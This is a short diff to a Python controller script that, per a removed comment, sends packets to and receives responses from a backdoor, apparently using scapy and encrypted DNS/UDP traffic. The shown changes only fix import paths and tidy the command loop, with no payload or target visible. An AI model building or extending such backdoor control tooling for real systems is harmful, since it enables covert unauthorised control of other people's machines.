@@ -1,8 +1,7 @@
-# This will contain the code for sending packets and receiving responses to the backdoor.
 
-from shell import *
+from utils.shell import *
 from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS
-from encryption import *
+from utils.encryption import *
 from multiprocessing import Process, SimpleQueue
 from socket import socket, SOCK_DGRAM, AF_INET
 
@@ -72,8 +71,10 @@ if __name__ == "__main__":
         if arg_count == 1:
             if command == HELP:
                 print_help()
+                continue
             elif command == CLEAR:
                 clear_screen()
+                continue
             elif command == EXIT:
                 break
         if arg_count == 2:
@@ -92,4 +93,6 @@ if __name__ == "__main__":
                 decrypted = encryption_handler.decrypt(encrypted)
                 print(f"Response: {decrypted.decode('utf-8')}")
                 continue
+        else:
+            print(f"Command not found: {command}")
     decode_process.kill()
